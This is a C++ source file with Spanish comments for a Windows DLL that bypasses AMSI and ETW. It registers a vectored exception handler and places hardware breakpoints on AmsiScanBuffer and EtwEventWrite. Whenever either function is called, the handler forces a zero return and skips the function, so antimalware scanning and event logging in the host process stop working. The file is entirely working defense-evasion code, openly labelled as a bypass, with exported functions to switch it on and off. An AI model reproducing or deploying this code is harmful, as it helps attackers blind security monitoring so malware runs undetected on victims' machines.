// ============================================================
// amsi_etw_bypass.cpp
// DLL de bypass de AMSI y ETW mediante hardware breakpoints


#include "pch.h"
#include <amsi.h>
#include <evntprov.h>
#include <evntrace.h>

// ============================================================
// TIPOS DE FUNCIÓN (cargadas dinámicamente)
// ============================================================
typedef VOID(NTAPI* pRtlCaptureContext)(PCONTEXT ContextRecord);
typedef NTSTATUS(NTAPI* pNtContinue)(PCONTEXT ContextRecord, BOOLEAN TestAlert);

// ============================================================
// VARIABLES GLOBALES
// ============================================================
static PVOID g_vehHandle = nullptr;
static PVOID g_amsiScanBufferAddr = nullptr;
static PVOID g_etwEventWriteAddr = nullptr;
static pNtContinue g_NtContinue = nullptr;
static pRtlCaptureContext g_RtlCaptureContext = nullptr;

LONG WINAPI VEH_Handler(PEXCEPTION_POINTERS ExceptionInfo)
{
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP)
    {
        PCONTEXT ctx = ExceptionInfo->ContextRecord;

        ctx->Rax = 0;

        ctx->Rip = *(DWORD64*)ctx->Rsp;
        ctx->Rsp += 8;

        ctx->EFlags &= ~(1ULL << 16);

        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

BOOL LoadNtdllFunctions()
{
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return FALSE;

    g_NtContinue = (pNtContinue)GetProcAddress(hNtdll, "NtContinue");
    g_RtlCaptureContext = (pRtlCaptureContext)GetProcAddress(hNtdll, "RtlCaptureContext");

    return (g_NtContinue != nullptr && g_RtlCaptureContext != nullptr);
}

BOOL SetupHardwareBreakpoints()
{
    if (!LoadNtdllFunctions())
    {
        OutputDebugStringW(L"[Bypass] ERROR: No se pudieron cargar funciones de ntdll\n");
        return FALSE;
    }

    HMODULE hAmsi = LoadLibraryW(L"amsi.dll");
    if (!hAmsi) return FALSE;

    g_amsiScanBufferAddr = GetProcAddress(hAmsi, "AmsiScanBuffer");

    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    g_etwEventWriteAddr = GetProcAddress(hNtdll, "EtwEventWrite");

    if (!g_amsiScanBufferAddr) return FALSE;

 
    g_vehHandle = AddVectoredExceptionHandler(1, VEH_Handler);
    if (!g_vehHandle) return FALSE;


    CONTEXT ctx = { 0 };
    g_RtlCaptureContext(&ctx);

 
    ctx.Dr0 = (DWORD64)g_amsiScanBufferAddr;


    if (g_etwEventWriteAddr)
        ctx.Dr1 = (DWORD64)g_etwEventWriteAddr;

 
    ctx.Dr7 |= (1ULL << 0);
    if (g_etwEventWriteAddr)
        ctx.Dr7 |= (1ULL << 2);


    ctx.Dr7 &= ~(3ULL << 16);
    ctx.Dr7 &= ~(3ULL << 18);
    ctx.Dr7 &= ~(3ULL << 20);
    ctx.Dr7 &= ~(3ULL << 22);

    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    NTSTATUS status = g_NtContinue(&ctx, FALSE);
    return (status == 0);
}

// ============================================================
// Exportadas
// ============================================================
extern "C" __declspec(dllexport) BOOL InitializeBypass()
{
    OutputDebugStringW(L"[AmsiEtwBypass] Inicializando bypass...\n");

    if (!SetupHardwareBreakpoints())
    {
        OutputDebugStringW(L"[AmsiEtwBypass] ERROR: No se pudo configurar\n");
        return FALSE;
    }

    OutputDebugStringW(L"[AmsiEtwBypass] Bypass configurado\n");
    return TRUE;
}

extern "C" __declspec(dllexport) void CleanupBypass()
{
    if (g_vehHandle)
    {
        RemoveVectoredExceptionHandler(g_vehHandle);
        g_vehHandle = nullptr;
    }

    if (g_RtlCaptureContext && g_NtContinue)
    {
        CONTEXT ctx = { 0 };
        g_RtlCaptureContext(&ctx);
        ctx.Dr0 = 0;
        ctx.Dr1 = 0;
        ctx.Dr7 = 0;
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        g_NtContinue(&ctx, FALSE);
    }

    OutputDebugStringW(L"[AmsiEtwBypass] Bypass limpiado\n");
}

// ============================================================
// DllMain
// ============================================================
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        OutputDebugStringW(L"[AmsiEtwBypass] DLL cargada\n");
        break;
    case DLL_PROCESS_DETACH:
        CleanupBypass();
        break;
    }
    return TRUE;
}
